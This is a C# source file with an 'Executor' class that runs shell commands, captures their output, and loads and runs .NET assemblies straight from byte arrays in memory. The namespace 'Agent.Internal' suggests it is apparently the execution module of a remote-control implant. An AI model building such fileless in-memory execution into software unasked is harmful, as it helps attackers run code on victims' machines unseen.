using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Internal
{
    public static class Executor
    {
        public static void StartCommand(string fileName, string arguments)
        {
            var startInfo = new ProcessStartInfo()
            {
                FileName = fileName,
                Arguments = arguments,
                WorkingDirectory = Directory.GetCurrentDirectory(),
                UseShellExecute = false,
                //CreateNoWindow = true,
            };

            var process = new Process
            {
                StartInfo = startInfo,
            };
           
            process.Start();
        }

        public static string ExecuteCommand(string fileName, string arguments)
        {
            var startInfo = new ProcessStartInfo()
            {
                FileName = fileName,
                Arguments = arguments,
                WorkingDirectory = Directory.GetCurrentDirectory(),
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,

            };

            var process = new Process
            {
                StartInfo = startInfo,
            };

            string output = string.Empty;
            process.OutputDataReceived += (s, e) => { output += e.Data + Environment.NewLine; };
            process.ErrorDataReceived += (s, e) => { output += e.Data + Environment.NewLine; };

            process.Start();

            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            process.WaitForExit();

            //output += process.StandardOutput.ReadToEnd();
            //output += process.StandardError.ReadToEnd();

            return output;
        }

        public static string ExecuteAssembly(byte[] asm, string[] arguments = null)
        {
            if (arguments is null)
                arguments = new string[] { };

            //Console.WriteLine($"Exec assembly {arguments.Length} : {string.Join("|",arguments)}");

            var currentOut = Console.Out;
            var currentError = Console.Out;
            using (var ms = new MemoryStream())
            using (var sw = new StreamWriter(ms))
            {
                Console.SetOut(sw);
                Console.SetError(sw);
                sw.AutoFlush = true;
                

                var assembly = Assembly.Load(asm);
                assembly.EntryPoint.Invoke(null, new object[] { arguments });

                Console.Out.Flush();
                Console.Error.Flush();

                Console.SetOut(currentOut);
                Console.SetError(currentError);

                var output = Encoding.UTF8.GetString(ms.ToArray());

                return output;
            }
        }
    }
}
